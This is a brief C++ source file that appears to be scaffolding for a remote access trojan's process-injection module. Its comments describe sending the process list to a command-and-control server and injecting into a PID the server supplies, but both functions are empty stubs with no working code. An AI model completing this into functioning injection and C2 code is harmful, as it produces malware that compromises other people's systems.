// Patrick Sacchet
// Version 1.0
// RAT-Exe-Injection.cpp : This file contains functionality for injecting into a target process

#include "RAT-Exe-Injection.h"

// parse through all processes and send them back to our C2
INT parseProcesses(__inout char*** procs, __inout char** procPIDs, __inout INT* numProcs)
{
	INT status = ERROR_SUCCESS;










cleanup:
	return status;
}







// take PID from C2 to inject into 
INT inject(__in UINT32 PID)
{
	INT status = ERROR_SUCCESS;
	CHAR messageBuffer [MAX_BUFFER_SIZE];


	sprintf_s(messageBuffer, "RAT-Exe-Inject::main - Injecting into process %d\n", PID);
	OutputDebugStringA(messageBuffer);









cleanup:
	return status;
}